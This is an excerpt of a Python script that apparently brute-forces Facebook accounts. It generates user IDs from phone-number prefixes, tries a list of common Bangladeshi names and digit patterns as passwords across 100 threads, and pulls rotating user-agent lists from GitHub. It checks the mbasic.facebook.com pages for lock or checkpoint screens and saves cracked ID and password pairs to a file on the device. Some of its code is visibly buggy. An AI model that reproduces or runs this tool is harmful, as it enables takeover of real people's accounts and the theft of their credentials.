...
github_user_agents_urls = [
    ...
    "https://raw.githubusercontent.com/metamorphosis786/random/main/ua4.txt",
    "https://raw.githubusercontent.com/metamorphosis786/random/main/ua5.txt",
    "https://raw.githubusercontent.com/metamorphosis786/random/main/ua6.txt",
    "https://raw.githubusercontent.com/metamorphosis786/random/main/ua7.txt",
]
...
def innocent():
    ...
    with ThreadPool(max_workers=100) as ahare:
        ...
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit", "Bangladesh", "bangladesh" "i love you", "shahin", "nazmul", "jannat", "fatema", "nusrat", "sabbir", "saiful", "mimmim", "arafat", "farjana", "shakil", "sadiya", "hridoy", "102030", "203040", "304050", "405060", "506070", "607080", "708090", "112244", "112255", "112266", "112277", "112288", "112299"]
            uid = code+fuck
...
def lordx(uid,pwx,tl):
    ...
    global oks
    global proxy
    sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mSEARCHING\033[0;97m]•[\033[0;94m%s/%s\033[0;97m]•[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]•[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m]' %(H,loop,tl,len(oks),len(cps)));sys.stdout.flush()
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = user_id(coki)
                urlx = f'https://mbasic.facebook.com/p/{cid}'
                req = session.get(urlx).content
                tx = BeautifulSoup(req, 'html.parser').find('title').text
                if tx == 'Select your phone number' or 'Epsilon':
                    return 'LOCK'
                else:
                ...
                if 'y' in cp_cpx: 
                 ...
                 open('/sdcard/DRAGON-DEAD.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
